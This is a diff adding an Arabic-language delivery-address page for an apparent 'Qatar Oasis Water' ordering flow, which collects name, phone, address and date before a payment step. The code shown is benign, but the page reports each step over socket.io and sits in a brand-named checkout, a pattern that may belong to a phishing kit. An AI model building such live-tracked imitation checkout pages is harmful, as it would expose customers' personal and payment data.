@@ -1,0 +1,183 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <title>بيانات التوصيل - مياه واحة قطر</title>
+  <link rel="stylesheet" href="../css/style.css">
+  <script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
+  <style>
+    #date{
+      width: 90%;
+      direction: ltr;
+      text-align: right;
+    }
+  </style>
+</head>
+<body>
+  <!-- Header -->
+  <header class="header">
+    <div class="container header-content">
+      <div class="logo">
+        <div class="logo-icon">💧</div>
+        <div class="logo-text">
+          <h1>مياه واحة قطر</h1>
+          <span>qatar Oasis Water</span>
+        </div>
+      </div>
+
+    </div>
+  </header>
+
+
+
+  <!-- Steps Progress -->
+  <div class="container">
+    <div class="steps">
+      <div class="step completed">
+        <div class="step-number">✓</div>
+        <span class="step-label">اختيار المنتج</span>
+      </div>
+      <div class="step-line"></div>
+      <div class="step active">
+        <div class="step-number">2</div>
+        <span class="step-label">عنوان التوصيل</span>
+      </div>
+      <div class="step-line"></div>
+      <div class="step">
+        <div class="step-number">3</div>
+        <span class="step-label">طريقة الدفع</span>
+      </div>
+      <div class="step-line"></div>
+
+    </div>
+  </div>
+
+  <!-- Delivery Form -->
+  <div class="form-container page">
+    <div class="form-title">
+      <span class="icon">📦</span>
+      <span>بيانات التوصيل</span>
+    </div>
+
+    <form id="deliveryForm">
+      <div class="form-group">
+        <label class="form-label">الاسم الكامل</label>
+        <input type="text" class="form-control" name="fullName" required placeholder="أدخل اسمك الكامل" autocomplete="off">
+      </div>
+
+<div class="form-group" style="text-align: right;">
+    <label class="form-label">رقم الهاتف</label>
+    <input 
+        type="tel" 
+        class="form-control" 
+        name="phone" 
+        required 
+        placeholder="+974 XXXX XXXX" 
+        style="direction: ltr; text-align: right;" 
+        autocomplete="off"
+    >
+</div>
+
+      <div class="form-group">
+        <label class="form-label">العنوان بالتفصيل</label>
+        <textarea class="form-control" name="address" required rows="2" placeholder="الشارع، رقم المبنى، رقم الشقة..." autocomplete="off"></textarea>
+      </div>
+
+      <div class="form-group">
+        <label class="form-label">تاريخ التوصيل</label>
+        <input type="date" id="date" class="form-control" name="deliveryDate" required>
+      </div>
+
+      <button type="submit" class="btn btn-primary" style="width:100%;padding:16px;margin-top:8px;">
+        <span>تأكيد العنوان </span>
+        <span>←</span>
+      </button>
+    </form>
+  </div>
+
+  <!-- Footer -->
+  <footer class="footer">
+    <div class="container">
+      <p>© 2024 مياه واحة قطر - جميع الحقوق محفوظة 💧</p>
+    </div>
+  </footer>
+
+  <script src="../js/main.js"></script>
+  <script>
+    document.addEventListener('DOMContentLoaded', () => {
+      trackPageChange('delivery');
+      
+      // Set minimum date to today (no past dates allowed)
+      const dateInput = document.getElementById('date');
+      const today = new Date();
+      const todayStr = today.toISOString().split('T')[0];
+      dateInput.min = todayStr;
+      dateInput.value = todayStr; // Default to today
+      
+      // SECURITY: Clear any previously saved sensitive data
+      // Only session_id is allowed to be stored
+      
+      const selectedProduct = JSON.parse(localStorage.getItem('selected_product_data') || 'null');
+      const quantity = parseInt(localStorage.getItem('selected_quantity') || '1', 10);
+
+      if (!selectedProduct) {
+        showToast('يرجى اختيار منتج أولاً', 'error');
+        setTimeout(() => {
+          window.location.href = '../index.html';
+        }, 1000);
+      }
+
+      const productSummary = document.createElement('div');
+      productSummary.className = 'order-summary';
+      productSummary.style.marginBottom = '18px';
+      productSummary.innerHTML = `
+        <h4>📋 ملخص الطلب</h4>
+        <div class="summary-row">
+          <span>المنتج</span>
+          <span>${selectedProduct ? selectedProduct.name_ar : '—'}</span>
+        </div>
+        <div class="summary-row">
+          <span>الكمية</span>
+          <span>${quantity}</span>
+        </div>
+        <div class="summary-row">
+          <span>السعر</span>
+          <span>${selectedProduct ? Number(selectedProduct.price || 0).toFixed(2) : '0.00'} ر.ق</span>
+        </div>
+      `;
+      document.querySelector('.form-container').prepend(productSummary);
+
+      document.getElementById('deliveryForm').addEventListener('submit', (e) => {
+        e.preventDefault();
+        
+        const formData = new FormData(e.target);
+        const data = Object.fromEntries(formData.entries());
+        data.quantity = quantity;
+        data.productId = selectedProduct?.id;
+        data.productName = selectedProduct?.name_ar;
+        
+        // Validate date is not in the past
+        const selectedDate = new Date(data.deliveryDate);
+        const todayDate = new Date();
+        todayDate.setHours(0, 0, 0, 0);
+        
+        if (selectedDate < todayDate) {
+          showToast('لا يمكن اختيار تاريخ قديم', 'error');
+          return;
+        }
+        
+        submitDeliveryForm(data);
+        showToast('✓ تم حفظ بيانات التوصيل بنجاح');
+        
+        setTimeout(() => {
+          window.location.href = 'select.html';
+        }, 1000);
+      });
+      
+      // Focus first input
+      document.querySelector('[name="fullName"]')?.focus();
+    });
+  </script>
+</body>
+</html>
